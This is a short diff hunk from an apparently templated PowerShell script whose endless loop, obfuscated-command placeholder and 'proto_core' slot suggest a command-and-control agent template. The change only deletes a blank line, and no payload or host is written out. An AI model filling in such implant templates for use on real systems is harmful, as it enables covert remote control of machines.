@@ -178,7 +178,6 @@ while($true){
         {{ ron.obf_builtin_command }}($headers)
         $atr = $tr -join "`n"
         $plh = $atr
-
         if ($Script:tr -ne "0"){ 
             try {
                     {{ proto_core }}
